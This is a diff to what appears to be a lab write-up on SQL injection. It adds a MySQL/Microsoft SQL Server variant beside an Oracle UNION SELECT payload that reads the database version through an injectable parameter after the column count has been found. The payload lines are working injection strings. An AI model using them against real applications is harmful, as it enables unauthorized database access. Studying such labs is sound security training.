@@ -14,9 +14,13 @@ Determined column count:
 
 Confirmed 2 columns.
 
-Extract version:
+Extract version(oracle):
 
 ' UNION SELECT banner, NULL FROM v$version--
+
+Extract version(MySQL and Microsoft):
+
+' UNION SELECT @@VERSION,NULL--  (requires one space after the comment '--')
 
 ## Result
 Retrieved the Oracle database version.
